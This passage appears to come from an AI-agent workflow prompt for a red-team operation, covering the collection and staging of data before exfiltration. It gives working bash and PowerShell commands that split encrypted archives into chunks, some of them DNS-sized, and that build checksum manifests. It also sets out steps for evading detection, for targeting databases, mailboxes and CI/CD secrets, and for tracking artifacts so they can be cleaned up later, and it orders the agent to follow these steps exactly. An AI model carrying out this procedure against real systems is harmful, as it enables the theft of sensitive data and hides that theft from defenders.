split -b 50K -d --additional-suffix=.enc {{staging_path}}/{{target_id}}.7z.enc {{staging_path}}/dns_{{target_id}}_

# Windows PowerShell — split into chunks
$chunkSize = 50MB
$file = "{{staging_path}}\{{target_id}}.7z.enc"
$buffer = New-Object byte[] $chunkSize
$stream = [System.IO.File]::OpenRead($file)
$chunkNum = 0
while ($stream.Position -lt $stream.Length) {
  $bytesRead = $stream.Read($buffer, 0, $chunkSize)
  $chunkPath = "{{staging_path}}\{{target_id}}_$($chunkNum.ToString('D3')).enc"
  [System.IO.File]::WriteAllBytes($chunkPath, $buffer[0..($bytesRead-1)])
  $chunkNum++
}
$stream.Close()
```

#### 9c. Chunk Manifest Generation

**Create a manifest file tracking all chunks for reassembly:**

```
# Generate manifest with checksums
echo "=== CHUNK MANIFEST ===" > {{staging_path}}/{{target_id}}_manifest.txt
echo "Target: {{target_id}}" >> {{staging_path}}/{{target_id}}_manifest.txt
echo "Original file: {{target_id}}.7z.enc" >> {{staging_path}}/{{target_id}}_manifest.txt
echo "Total size: $(stat -c%s {{staging_path}}/{{target_id}}.7z.enc) bytes" >> {{staging_path}}/{{target_id}}_manifest.txt
echo "Chunk size: {{chunk_size}}" >> {{staging_path}}/{{target_id}}_manifest.txt
echo "Total chunks: $(ls {{staging_path}}/{{target_id}}_*.enc | wc -l)" >> {{staging_path}}/{{target_id}}_manifest.txt
echo "---" >> {{staging_path}}/{{target_id}}_manifest.txt
sha256sum {{staging_path}}/{{target_id}}_*.enc >> {{staging_path}}/{{target_id}}_manifest.txt

# Windows PowerShell manifest
$chunks = Get-ChildItem "{{staging_path}}\{{target_id}}_*.enc"
$manifest = @()
$manifest += "=== CHUNK MANIFEST ==="
$manifest += "Target: {{target_id}}"
$manifest += "Total chunks: $($chunks.Count)"
foreach ($chunk in $chunks | Sort-Object Name) {
  $hash = (Get-FileHash $chunk.FullName -Algorithm SHA256).Hash
  $manifest += "$hash  $($chunk.Name)  $($chunk.Length) bytes"
}
$manifest | Out-File "{{staging_path}}\{{target_id}}_manifest.txt"
```

**Naming convention for all chunks:**
```
Format: {target_id}_{chunk_number_3digit}.enc
Example: DB-001_000.enc, DB-001_001.enc, DB-001_002.enc
Manifest: {target_id}_manifest.txt
```

### 10. Staging Verification

Verify all staged data before proceeding to exfiltration. Every chunk must be accounted for, every file must be encrypted, every checksum must match.

#### 10a. Completeness Verification

```
# Verify all targets have been collected and staged
# For each target in the prioritized list:

echo "=== STAGING VERIFICATION ==="
for target_id in {{target_list}}; do
  echo "--- $target_id ---"
  echo "Encrypted file: $(ls -la {{staging_path}}/${target_id}*.enc 2>/dev/null | wc -l) files"
  echo "Chunks: $(ls {{staging_path}}/${target_id}_*.enc 2>/dev/null | wc -l)"
  echo "Manifest: $(ls {{staging_path}}/${target_id}_manifest.txt 2>/dev/null | wc -l)"
done
```

#### 10b. Encryption Verification

```
# Verify all staged files are encrypted (not cleartext)
for f in {{staging_path}}/*.enc; do
  file_type=$(file -b "$f")
  if echo "$file_type" | grep -qiE "text|csv|xml|html|json|sqlite|7-zip|gzip|zip"; then
    echo "WARNING: $f may NOT be encrypted — type: $file_type"
  else
    echo "OK: $f — type: $file_type (appears encrypted)"
  fi
done

# Verify no cleartext staging artifacts remain
find {{staging_path}} -type f ! -name "*.enc" ! -name "*manifest*" -ls
# If any non-.enc files found (except manifests), investigate and clean
```

#### 10c. Integrity Verification (SHA-256 Checksums)

```
# Generate verification checksums for all staged files
sha256sum {{staging_path}}/*.enc > {{staging_path}}/staging_checksums.sha256

# Windows PowerShell
Get-ChildItem "{{staging_path}}\*.enc" | ForEach-Object {
  "$((Get-FileHash $_.FullName -Algorithm SHA256).Hash)  $($_.Name)"
} | Out-File "{{staging_path}}\staging_checksums.sha256"

# Verify manifests match actual chunks
# For each target, compare manifest checksums against actual files
sha256sum -c {{staging_path}}/{{target_id}}_manifest.txt
```

#### 10d. Staging Space Verification

```
# Verify staging space sufficient for exfiltration operations
df -h {{staging_path}}  # Linux
Get-PSDrive -Name {{drive}} | Select-Object Free  # Windows

# Total staged data size
du -sh {{staging_path}}  # Linux
(Get-ChildItem {{staging_path}} -Recurse | Measure-Object Length -Sum).Sum / 1GB  # Windows (GB)
```

**Present Staging Verification table:**
```
| Target ID | Source | Encrypted File(s) | Chunks | Total Size | SHA-256 Verified | Manifest | Staging Host | Exfil Channel | Ready |
|-----------|--------|-------------------|--------|------------|-----------------|----------|-------------|---------------|-------|
| FS-001 | \\{{host}}\{{share}} | {{target_id}}.7z.enc | {{count}} | {{size}} | ✅ | ✅ | STG-001 | HTTPS | ✅ |
| DB-001 | {{host}}:1433 | {{target_id}}.7z.enc | {{count}} | {{size}} | ✅ | ✅ | STG-001 | Cloud | ✅ |
| EM-001 | {{tenant}} | {{target_id}}.7z.enc | {{count}} | {{size}} | ✅ | ✅ | STG-002 | HTTPS | ✅ |
| SEC-001 | {{host}}:8200 | {{target_id}}.age | 1 | {{size}} | ✅ | ✅ | STG-001 | DNS | ✅ |
| **TOTAL** | — | **{{total_files}}** | **{{total_chunks}}** | **{{total_size}}** | ✅ | ✅ | — | — | ✅ |
```

**Artifact tracking for cleanup (step-09):**
```
| Artifact ID | Type | Location | Created By | Cleanup Method | Priority |
|-------------|------|----------|-----------|---------------|----------|
| ART-001 | Encrypted archive | {{host}}:{{path}} | Compression+Encryption | Secure delete | High |
| ART-002 | Chunk files | {{host}}:{{path}} | Split operation | Secure delete | High |
| ART-003 | Manifest file | {{host}}:{{path}} | Checksumming | Secure delete | High |
| ART-004 | Temp directory | {{host}}:{{path}} | mkdir | Remove directory | Medium |
| ART-005 | GPG public key | {{host}}:~/.gnupg/ | GPG import | Remove keyring entry | Medium |
| ART-006 | Process artifacts | {{host}} | Tool execution | N/A (ephemeral) | Low |
```

### 11. Document Findings

**Write consolidated staging operations findings to the output document under `## Data Collection & Staging`:**

```markdown
## Data Collection & Staging

### Staging Infrastructure
{{staging_table — hosts, locations, space, monitoring, connectivity}}

### Collection Operations Log
{{collection_log — per-target extraction method, time, volume, OPSEC events}}

### Compression Results
{{compression_table — per-target source size, compressed size, ratio, format}}

### Encryption Verification
{{encryption_table — per-target encryption method, key type, verification status}}

### Chunking Summary
{{chunking_table — per-target chunk count, chunk size, manifest status}}

### Staging Verification
{{verification_table — completeness, encryption, integrity, space checks}}

### Artifact Tracking
{{artifact_table — all staging artifacts for cleanup in step-09}}

### Staging OPSEC Log
{{opsec_log — all detection events generated during collection and staging}}
```

### 12. Present MENU OPTIONS

"**Data collection and staging complete.**

Summary: {{total_targets}} targets collected and staged — {{total_raw}} raw data compressed to {{total_compressed}} ({{ratio}}% ratio), encrypted with {{encryption_method}}, split into {{total_chunks}} chunks across {{staging_count}} staging points. All checksums verified. {{artifact_count}} staging artifacts tracked for cleanup.
Ready for exfiltration: {{ready_count}}/{{total_targets}} targets staged and verified.
Next: Network exfiltration (HTTPS/direct channels) for {{network_targets}} targets.

**Select an option:**
[A] Advanced Elicitation — Deep dive into staging decisions (alternative staging locations, encryption strength assessment, chunk size optimization, artifact minimization techniques)
[W] War Room — Red (staging efficiency, ADS/ramdisk techniques for artifact reduction, compression ratio optimization, multi-stage staging for large datasets) vs Blue (staging artifact detection, encrypted file indicators, compression tool forensics, file access pattern analysis, timeline reconstruction from staging events)
[C] Continue — Proceed to Step 5: Network Exfiltration"

#### Menu Handling Logic:

- IF A: Deep-dive analysis of staging decisions — explore alternative staging locations (ADS, ramdisk, cloud staging), assess whether encryption method is optimal for the exfiltration channel, optimize chunk sizes for channel capacity, investigate techniques to minimize staging artifacts, challenge the staging infrastructure choice. Process insights, ask user if they want to update findings, if yes update then redisplay menu, if no redisplay menu
- IF W: War Room discussion — Red Team perspective: is staging footprint minimized? Can ADS or ramdisk staging reduce forensic artifacts? Is compression ratio optimal for the data types collected? Can staging be distributed across multiple hosts to reduce per-host footprint? Can cloud staging (temporary S3 bucket, Azure Blob) bypass on-prem detection entirely? Blue Team perspective: what staging artifacts would IR teams find? Can encrypted file creation be detected via Sysmon Event 11/15? Do compression tools leave forensic traces (temp files, registry entries)? Can file access timeline analysis reconstruct the collection sequence? What file integrity monitoring should detect staging operations? Summarize insights, redisplay menu
- IF C: Update output file frontmatter adding this step name to the end of stepsCompleted array, then read fully and follow: ./step-05-network-exfil.md
- IF user asks questions: Answer and redisplay menu

#### EXECUTION RULES:

- ALWAYS halt and wait for user input after presenting menu
- ONLY proceed to next step when user selects 'C'
- After other menu item execution, return to this menu

## CRITICAL STEP COMPLETION NOTE

ONLY WHEN [C continue option] is selected and [frontmatter properly updated with this step added to stepsCompleted and staging operations findings appended to report], will you then read fully and follow: `./step-05-network-exfil.md` to begin network exfiltration.

---

## 🚨 SYSTEM SUCCESS/FAILURE METRICS

### ✅ SUCCESS:

- Staging infrastructure established with host selection, space verification, and tool availability assessment
- Encryption keys generated operator-side and deployed securely to staging hosts
- File collection executed with targeted patterns, rate limiting, and OPSEC-aware scheduling
- Database extraction performed with pagination, targeted queries, and WHERE clause filtering
- Email extraction limited to prioritized mailboxes with keyword-based content filtering
- Source code and CI/CD secrets collected from prioritized repositories
- Cloud data collected with selective sync patterns and bandwidth awareness
- ALL collected data compressed with recorded compression ratios
- ALL staged data encrypted — zero cleartext artifacts in staging locations
- Encrypted archives chunked to match planned exfiltration channel capacity
- Chunk manifests generated with SHA-256 checksums for integrity verification
- Staging verification completed: completeness, encryption, integrity, and space checks all passed
- ALL staging artifacts tracked for cleanup in step-09
- Findings appended to report under `## Data Collection & Staging`
- Menu presented and user input handled correctly
- Frontmatter updated with this step name added to stepsCompleted

### ❌ SYSTEM FAILURE:

- Beginning actual exfiltration during staging (that is steps 05-07)
- Leaving unencrypted data in staging locations — ALL staged files must be encrypted
- Compressing AFTER encryption (encrypted data does not compress — wasted effort and larger files)
- Not generating checksums for staged data (integrity verification required for reliable exfiltration)
- Not tracking staging artifacts (cleanup in step-09 depends on complete artifact inventory)
- Mass file copy without rate limiting or targeting (triggers storage monitoring alerts)
- Full database dumps without pagination or filtering (generates DBA alerts and excessive I/O)
- Not matching chunk sizes to exfiltration channel capacity (chunks too large fail transfer, too small waste overhead)
- Not verifying encryption before deleting source files (data loss risk)
- Storing encryption passwords/private keys on target systems
- Proceeding without user selecting 'C' (Continue)
- Not documenting OPSEC events from collection and staging operations

**Master Rule:** Skipping steps, optimizing sequences, or not following exact instructions is FORBIDDEN and constitutes SYSTEM FAILURE. This is DATA COLLECTION AND STAGING — no exfiltration. Every target must be collected according to the prioritized list, compressed, encrypted, chunked, verified, and staged. Every artifact must be documented for cleanup.
